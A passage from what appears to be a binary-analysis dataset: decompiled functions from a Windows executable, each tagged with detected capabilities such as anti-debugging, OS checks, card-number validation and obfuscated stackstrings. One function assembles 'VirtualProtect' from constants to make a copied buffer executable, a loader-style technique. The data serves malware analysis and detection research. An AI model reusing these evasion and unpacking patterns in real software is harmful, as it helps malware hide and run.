uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x5026f0;\n                }\n                goto code_r0x0040ca28;\n            }\n            iVar13 = *0x5026f4 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040c81c;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040c81c:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040ca28:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.00407bbf(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3271
    },
    "0040ca75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040ca75(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x502220 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x502714;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x502710 + -1;\n        iVar14 = *0x502710 + (*0x502710 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x502710 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040cbb9;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040cbc0;\ncode_r0x0040cbb9:\n                        do {\n                            bVar6 = true;\ncode_r0x0040cbc0:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040cbce;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040cbce:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x50270c - *0x502710) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x50270c < iVar14) {\n                if (iVar14 < *0x502708) {\n                    iVar14 = iVar14 + *0x50271c;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x502714 + (*0x502714 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x502714 + (*0x502714 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x50271c + *0x502708;\n                }\n                goto code_r0x0040cf79;\n            }\n            iVar13 = *0x50270c - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x502710 + -1;\n            iVar13 = *0x502710 + (*0x502710 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x502710 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040cd6d;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040cd6d:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x502714 + 1 + (*0x502714 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040cf79:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x502718 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x502718 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.00407bbf(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3213
    },
    "0040da7d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040da7d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x502220 ^ &stack0xfffffffc;\n    fcn.00405697(arg_10h);\n    var_14h = fcn.00407bce(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c524(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040dad6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040db16;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040db08:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040db16;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040db08;\n        goto code_r0x0040dad6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040db16:\n    fcn.00407bbf(unaff_EBX);\n    return;\n}\n",
        "token_count": 502
    },
    "0040db25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040db25(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x502220 ^ &stack0xfffffffc;\n    fcn.00405697(arg_10h);\n    var_14h = fcn.00407bce(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040ca75(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040db7e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040dbbe;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040dbb0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040dbbe;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040dbb0;\n        goto code_r0x0040db7e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040dbbe:\n    fcn.00407bbf(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0040df37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040df37(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x502220 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0040734b();\n    var_14h = 0;\n    if (*0x71b284 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x402c04);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x402bf8), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040e094;\n        *0x71b284 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x402be8);\n        *0x71b288 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402bd4);\n        *0x71b28c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402bb8);\n        *0x71b294 = (*pcVar4)(uVar3);\n        if (*0x71b294 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x402ba0);\n            *0x71b290 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x71b290 == var_18h) || (*0x71b294 == var_18h)) {\ncode_r0x0040e043:\n        if ((((*0x71b288 != var_18h) && (pcVar4 = (*pcVar6)(*0x71b288),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x71b28c != var_18h && (pcVar4 = (*pcVar6)(*0x71b28c),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x71b290);\n        pcVar5 = (*pcVar6)(*0x71b294);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040e043;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x71b284);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040e094:\n    fcn.00407bbf(unaff_EBX);\n    return;\n}\n",
        "token_count": 936
    },
    "004059bb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059bb(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401364;\n    fcn.00405936();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040564a();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "004082ba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004082ba(uint32_t arg_8h)\n\n{\n    fcn.004082aa();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040564a();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00408486": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408486(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4017dc;\n    fcn.004059b0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040564a();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0040b13c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b13c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a730(0x411180, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00406201();\n        *puVar2 = 0;\n        puVar2 = fcn.004061ee();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x71c304)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x71c320;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040e4f1(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004061ee();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00406201();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040aa3f(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040b208();\n                goto code_r0x0040b1ff;\n            }\n        }\n        puVar2 = fcn.00406201();\n        *puVar2 = 0;\n        puVar2 = fcn.004061ee();\n        *puVar2 = 9;\n        fcn.0040619c();\n    }\ncode_r0x0040b1ff:\n    fcn.0040a775();\n    return;\n}\n",
        "token_count": 609
    },
    "00403540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403540(int32_t *param_1)\n\n{\n    *param_1 = *param_1 + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 43
    },
    "00403840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain obfuscated stackstrings",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403840(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x71a504 != 0) {\n        do {\n            *(uVar1 + param_1) = *(param_2 + 0xb2d3b + uVar1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x71a504);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00403c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00403c20(void)\n\n{\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x711f60;\n    uStack16 = 0x403c2e;\n    *0x711f4c = (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n    uStack16 = 0x502a20;\n    *0x502a20 = 0x74726956;\n    *0x502a24 = 0x506c6175;\n    *0x502a28 = 0x65746f72;\n    *0x502a2c = 0x7463;\n    *0x502a2e = 0;\n    *0x70ea4c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x711f4c);\n    (**0x70ea4c)(*0x70ea64, *0x71a504, 0x40, &stack0xfffffff0);\n    return;\n}\n",
        "token_count": 222
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004066c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066c1(uint arg_8h)\n\n{\n    fcn.00406581(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "0040a6bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a6d3)\n// WARNING: Removing unreachable block (ram,0x0040a6d9)\n// WARNING: Removing unreachable block (ram,0x0040a6db)\n\nvoid fcn.0040a6bf(void)\n\n{\n    return;\n}\n",
        "token_count": 70
    },
    "0040bb7c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bb7c(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00406404(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040f724": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040f724(void)\n\n{\n    *0x5029f0 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x403364, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "0040d2b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d2b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a730(0x411200, 0xc);\n    fcn.0040b867(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x71b278;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x71b274;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040d2f4;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00406404(arg_8h_00);\ncode_r0x0040d2f4:\n        fcn.00406404(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040d317();\n    fcn.0040a775();\n    return;\n}\n",
